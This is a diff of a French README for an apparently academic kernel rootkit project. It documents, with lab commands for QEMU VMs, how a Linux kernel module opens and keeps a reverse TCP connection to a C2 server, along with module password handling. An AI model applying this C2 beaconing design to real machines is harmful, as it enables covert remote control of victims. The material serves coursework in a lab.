@@ -13,10 +13,19 @@ Le rootkit est un module kernel Linux (LKM) qui s'installe sur une machine victi
 ├── AUTHORS
 ├── README.md
 ├── TODO
-├── rootkit/               # Code source du module kernel (victim)
+├── DESIGN.md
+├── epirootkit-subject.pdf
+├── vm.sh                        # Script QEMU : crée et lance les deux VMs
+├── vmshare/                     # Dossier partagé hôte ↔ VMs (VirtFS/9p)
+│   ├── rootkit/                 # Copie de travail compilée sur la victime
+│   └── attacking_program/       # Copie de travail compilée sur l'attaquant
+├── rootkit/                     # Code source du module kernel (victim)
 │   ├── Makefile
 │   └── wlkom.c
-└── attacking_program/     # Code source du programme C2 (attaquant)
+├── attacking_program/           # Code source du programme C2 (attaquant)
+│   ├── Makefile
+│   └── c2.c
+
 ```
 
 ---
@@ -231,14 +240,163 @@ sudo rmmod wlkom
 
 ### Compile (0.5pt) — DONE
 
+
+
 Makefile LKM standard ciblant `wlkom.ko`.
 Voir [rootkit/Makefile](rootkit/Makefile).
 
-### Connection (3pt) — TODO
+### Connection (3pt) — DONE
+
+#### Fonctionnement
+
+Au chargement du module (`insmod`), un **kthread kernel** (`wlkom_conn`) est lancé.
+Il tourne en arrière-plan dans le kernel et gère le cycle de vie de la connexion TCP vers le C2.
+
+```
+insmod wlkom.ko
+    └─ wlkom_init()
+         └─ kthread_run(connection_thread)
+                │
+                ▼
+         ┌─────────────────────────────────────────┐
+         │  while (!kthread_should_stop())          │
+         │                                          │
+         │    do_connect()                          │
+         │      sock_create(AF_INET, SOCK_STREAM)   │
+         │      sock->ops->connect(c2_ip, c2_port)  │
+         │                                          │
+         │    si échec → pr_err + sleep 5s → retry  │
+         │                                          │
+         │    si succès → pr_info "connected"       │
+         │      kernel_recvmsg() loop               │
+         │        (bloquant, détecte déconnexion)   │
+         │      ret == 0 → C2 fermé                 │
+         │      ret < 0  → erreur réseau            │
+         │      → shutdown + sock_release + retry   │
+         └─────────────────────────────────────────┘
+                │
+         rmmod wlkom
+              └─ wlkom_exit()
+                   ├─ kernel_sock_shutdown()  ← débloque recvmsg
+                   ├─ kthread_stop()          ← attend la fin du thread
+                   └─ sock_release()
+```
+
+**Pourquoi `kernel_sock_shutdown` avant `kthread_stop` ?**
+`kthread_stop` est bloquant — il attend que le thread retourne. Si le thread est bloqué
+sur `kernel_recvmsg`, il n'en sort jamais sans une interruption externe. Le `shutdown`
+ferme le socket côté kernel, ce qui fait retourner `recvmsg` avec une erreur,
+permettant au thread de tester `kthread_should_stop()` et de sortir proprement.
+
+**Pourquoi `schedule_timeout_interruptible` plutôt que `ssleep` pour le retry ?**
+`schedule_timeout_interruptible` rend le thread interruptible pendant l'attente :
+`kthread_stop` peut le réveiller immédiatement sans attendre les 5 secondes.
+Avec `ssleep`, le `rmmod` bloquerait 5s à chaque retry en cours.
+
+#### Paramètres
+
+| Paramètre | Défaut | Description |
+|---|---|---|
+| `c2_ip` | `192.168.100.10` | IP de la VM attaquante (définie dans `vm.sh`) |
+| `c2_port` | `4444` | Port TCP du C2 (défini dans `vm.sh`) |
+
+Les valeurs par défaut correspondent à l'infra `vm.sh`. Les passer explicitement à l'`insmod`
+n'est nécessaire que si on utilise une autre configuration réseau.
+
+#### Fichiers
+
+| Fichier | Rôle |
+|---|---|
+| [rootkit/wlkom.c](rootkit/wlkom.c) | Module kernel — kthread + socket TCP |
+| [attacking_program/c2.c](attacking_program/c2.c) | Serveur C2 userland |
+| [attacking_program/Makefile](attacking_program/Makefile) | Build du C2 |
+
+#### Étapes pour tester la connexion
+
+**1. Compiler et lancer le C2 sur la VM attaquante**
+
+```bash
+# SSH vers l'attaquant
+ssh -p 10023 epita@localhost   # mdp : epita
+
+# Compiler (une seule fois)
+cd /mnt/vmshare/attacking_program && make
+
+# Lancer le C2
+./c2 4444
+# → C2 listening on port 4444
+# → [HH:MM:SS] [?] Waiting for rootkit connection...
+```
+
+**2. Compiler et charger le module sur la VM victime**
+
+```bash
+# SSH vers la victime (dans un autre terminal)
+ssh -p 10022 epita@localhost   # mdp : epita
+
+# Compiler (une seule fois, doit se faire sur la victime)
+cd /mnt/vmshare/rootkit && make
+
+# Charger le module (les defaults c2_ip/c2_port correspondent à vm.sh)
+sudo insmod wlkom.ko password=<mdp>
+```
+
+**3. Vérifier la connexion**
+
+Sur l'attaquant, le C2 affiche :
+```
+[HH:MM:SS] [+] Rootkit connected from 192.168.100.20
+```
+
+Sur la victime, voir les logs kernel en temps réel :
+```bash
+dmesg -w
+# → wlkom: loaded
+# → wlkom: connected to C2 192.168.100.10:4444
+```
+
+**4. Tester le retry**
+
+Couper le C2 (`Ctrl+C`) — la victime affiche dans `dmesg` :
+```
+wlkom: disconnected from C2, retrying
+wlkom: C2 unreachable (-111), retry in 5s
+...
+```
+Relancer `./c2 4444` — reconnexion automatique sans toucher à la victime.
+
+**5. Décharger le module**
+
+```bash
+# Sur la victime
+sudo rmmod wlkom
+# → dmesg : "wlkom: unloaded"
+```
+
+Sur l'attaquant :
+```
+[HH:MM:SS] [-] Rootkit disconnected
+[HH:MM:SS] [?] Waiting for rootkit connection...
+```
 
 ### Persistence (1.5pt) — TODO
 
-### Password (1pt) — TODO
+### Password (1pt) — DONE (partiel)
+
+Le mot de passe est passé au module via `module_param` au moment de l'`insmod` :
+
+```bash
+sudo insmod wlkom.ko c2_ip=192.168.100.10 c2_port=4444 password="monmotdepasse"
+```
+
+Le module refuse de se charger si le paramètre est absent ou vide (`-EINVAL`).
+
+**Pourquoi `module_param` ?**
+C'est la façon idiomatique de passer de la configuration à un LKM sans hardcoder de valeur dans le binaire. Avec un mot de passe hardcodé, `strings wlkom.ko` l'exposerait immédiatement. Avec `module_param`, le `.ko` compilé ne contient aucun secret — le mot de passe est fourni à l'exécution par l'opérateur qui charge le module.
+
+**Permissions sysfs (`0400`)** : le paramètre est lisible après chargement par root uniquement via `/sys/module/wlkom/parameters/password`. Cela évite qu'un utilisateur non-privilégié puisse lire le mot de passe depuis l'espace utilisateur.
+
+**Ce qui reste à faire** : une fois Connection implémenté, le C2 devra envoyer `AUTH <password>` avant toute commande. Le rootkit comparera avec la valeur reçue à l'`insmod` et fermera la connexion si le mot de passe est incorrect.
 
 ### Executing commands (5pt) — TODO
 
